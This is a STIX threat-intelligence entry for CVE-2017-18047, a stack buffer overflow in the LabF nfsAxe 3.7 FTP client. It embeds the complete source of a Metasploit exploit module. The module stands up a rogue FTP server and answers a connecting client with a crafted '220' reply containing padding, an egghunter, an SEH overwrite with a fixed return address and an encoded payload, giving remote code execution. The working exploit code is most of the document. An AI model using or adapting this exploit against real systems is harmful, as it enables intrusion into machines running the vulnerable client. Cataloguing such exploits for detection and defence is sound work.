{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--48bb698b-92cf-44fb-b794-f42ec91f44d5",
    "created": "2024-08-14T16:50:50.149736Z",
    "modified": "2024-08-14T16:50:50.149739Z",
    "name": "LabF nfsAxe 3.7 FTP Client Stack Buffer Overflow",
    "description": " This module exploits a buffer overflow in the LabF nfsAxe 3.7 FTP Client allowing remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/labf_nfsaxe.rb",
            "external_id": "labf_nfsaxe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-18047"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::Seh\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'LabF nfsAxe 3.7 FTP Client Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the LabF nfsAxe 3.7 FTP Client allowing remote\n          code execution.\n        },\n      'Author'   =>\n        [\n          'Tulpa',           # Original exploit author\n          'Daniel Teixeira'  # MSF module author\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-18047' ],\n          [ 'EDB', '42011' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x10\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # p/p/r in wcmpa10.dll\n          [ 'Windows Universal', {'Ret' => 0x6801549F } ]\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'SRVHOST' => '0.0.0.0',\n        },\n      'DisclosureDate' => '2017-05-15',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The FTP port to listen on\", 21 ])\n      ])\n  end\n\n  def exploit\n    srv_ip_for_client = datastore['SRVHOST']\n    if srv_ip_for_client == '0.0.0.0'\n      if datastore['LHOST']\n        srv_ip_for_client = datastore['LHOST']\n      else\n        srv_ip_for_client = Rex::Socket.source_address('50.50.50.50')\n      end\n    end\n\n    srv_port = datastore['SRVPORT']\n\n    print_status(\"Please ask your target(s) to connect to #{srv_ip_for_client}:#{srv_port}\")\n    super\n  end\n\n  def on_client_connect(client)\n    return if ((p = regenerate_payload(client)) == nil)\n    print_status(\"#{client.peerhost} - connected.\")\n\n    res = client.get_once.to_s.strip\n    print_status(\"#{client.peerhost} - Request: #{res}\") unless res.empty?\n    print_status(\"#{client.peerhost} - Response: Sending 220 Welcome\")\n    welcome = \"220 Welcome.\\r\\n\"\n    client.put(welcome)\n\n    res = client.get_once.to_s.strip\n    print_status(\"#{client.peerhost} - Request: #{res}\")\n    print_status(\"#{client.peerhost} - Response: sending 331 OK\")\n    user = \"331 OK.\\r\\n\"\n    client.put(user)\n\n    res = client.get_once.to_s.strip\n    print_status(\"#{client.peerhost} - Request: #{res}\")\n    print_status(\"#{client.peerhost} - Response: Sending 230 OK\")\n    pass = \"230 OK.\\r\\n\"\n    client.put(pass)\n    res = client.get_once.to_s.strip\n    print_status(\"#{client.peerhost} - Request: #{res}\")\n\n    eggoptions = { :checksum => true }\n    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)\n\n    # \"\\x20\"s are used to make the attack less obvious\n    # on the target machine's screen.\n    sploit = \"220 \\\"\"\n    sploit << \"\\x20\"*(9833 - egg.length)\n    sploit << egg\n    sploit << generate_seh_record(target.ret)\n    sploit << hunter\n    sploit << \"\\x20\"*(576 - hunter.length)\n    sploit << \"\\\" is current directory\\r\\n\"\n\n    print_status(\"#{client.peerhost} - Request: Sending the malicious response\")\n    client.put(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-15",
    "x_mitre_platforms": [
        "win'"
    ]
}